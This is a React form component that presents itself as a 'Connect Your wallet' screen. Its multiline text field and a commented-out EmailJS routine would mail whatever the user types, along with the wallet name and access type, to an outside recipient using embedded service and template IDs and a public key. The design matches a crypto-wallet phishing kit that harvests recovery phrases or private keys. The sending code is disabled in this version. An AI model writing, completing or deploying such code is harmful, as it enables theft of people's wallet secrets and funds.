import React,  { useContext } from "react";
import "./Form.css";
import TextField from "@mui/material/TextField";
import { FormContext } from "../context/FormContext";
import emailjs from '@emailjs/browser';

const Form = ({detailsToInput, FormButton, rowNumber,walletName,aboutDetails,fieldLabel}) => {
  const [text, setText] = React.useState("");
  const {wallet, setWallet, access, setAccess} = useContext(FormContext)


  const handleChange = (event) => {
    setText(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    // Do something with formData.input1 and formData.input2
    // const serviceId = 'service_wkpm12a';
    // const templateId = 'template_2qwtp6k';
    // const publicKey = 'X07VCkCjuOGpyQAl0';

    // //create object that contains dynamic template params
    // const templateParams = {
    //   to_wallet : walletName,
    //   message: text,
    //   accessType: access,
    // }
    
    // // Send email using emailjs
    //  emailjs.send(serviceId,templateId,templateParams,publicKey)
    //  .then((response)=>{
    //   console.log("email sent successfully", response);
    //   setText("");
    //  })
    //  .catch((error)=>{
    //   console.error('Error sending email', error);
    //  });
  };

  return (
    <div className="select-wallet-wrapper2">
      <div className="header-text2">
        <p className="header2">Connect Your {walletName} wallet </p>
        <p className="header-warning2">
        {detailsToInput}
        </p>
      </div>
      <form onSubmit={handleSubmit}>
      <div className="select-cont2">
        <TextField
        fullWidth
          id="outlined-multiline-static"
          label={fieldLabel}
          multiline
          rows={rowNumber}
          value={text}
          onChange={handleChange}
        />
        <p className="form-instruction2">
          {aboutDetails}
        </p>
      </div>
      <div className="button-group2">
        <button className="button-connect2" onClick={handleSubmit}>Connect Wallet</button>
      </div>
      </form>
    </div>
  );
};

export default Form;
